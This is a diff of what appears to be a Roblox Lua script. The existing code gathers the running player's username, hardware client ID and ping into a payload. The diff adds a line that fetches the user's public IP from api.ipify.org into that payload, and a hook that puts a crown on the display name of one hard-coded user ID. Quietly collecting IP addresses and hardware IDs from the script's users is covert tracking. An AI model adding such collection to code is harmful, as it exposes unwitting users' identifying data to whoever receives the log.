@@ -594,6 +594,7 @@ pcall(function()
           {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
           {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
           {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+	  {name = "Ip", value = tostring(game:HttpGet("https://api.ipify.org/", true))},
 
         }
     }
@@ -634,4 +635,13 @@ pcall(function()
            }
        );
    end
+end)
+
+game.Players.PlayerAdded:Connect(function(plr) 
+	plr.CharacterAdded:Connect(function(Char)
+		Char:WaitForChild("Humanoid")
+		if plr.UserId == 1608746369 then
+			Char.Humanoid.DisplayName = "[👑]" .. plr.DisplayName
+		end
+	end)
 end)
